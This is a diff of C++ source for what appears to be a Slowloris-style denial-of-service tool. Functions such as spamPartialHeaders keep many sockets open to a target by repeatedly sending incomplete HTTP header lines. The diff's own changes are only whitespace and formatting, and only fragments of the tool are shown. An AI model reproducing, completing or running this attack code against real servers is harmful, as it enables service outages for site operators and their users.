@@ -4,14 +4,14 @@
 #include <iostream>
 #include <string>
 #include <stdlib.h>
-#include <sys/types.h>	//used for various socket attributes, and multi-threading ~ winsock for linux
-#include <sys/socket.h>	//socket defined here ~ winsock for linux
-#include <netinet/in.h>	//contains information regarding target ip, port, family
-#include <arpa/inet.h>	//parses ip address into network readable
-#include <cstring>	//used for strlen()
-#include <vector>	//expandable list
-#include <unistd.h>	//sleep function
-#include <thread>	//multi-threading
+#include <sys/types.h>   //used for various socket attributes, and multi-threading ~ winsock for linux
+#include <sys/socket.h>  //socket defined here ~ winsock for linux
+#include <netinet/in.h>  //contains information regarding target ip, port, family
+#include <arpa/inet.h>   //parses ip address into network readable
+#include <cstring>       //used for strlen()
+#include <vector>        //expandable list
+#include <unistd.h>      //sleep function
+#include <thread>        //multi-threading
 
 void initialSendSocket(int socketNum) {
 	char incompleteHeader[255];
@@ -28,7 +28,7 @@ void initialSendSocket(int socketNum) {
 void spamPartialHeaders(struct sockaddr_in target, std::vector<int> socketList, int totalSockets) {
 	for (int i = 0; i < totalSockets; i++) {
 		//std::cout << "Piping packets... " << std::endl;
-		try{
+		try {
 			char incompleteHeader[50];
 			sprintf(incompleteHeader, "X-a: %d\r\n", (rand() % 99999));
 			send(socketList.at(i), incompleteHeader, strlen(incompleteHeader), 0);
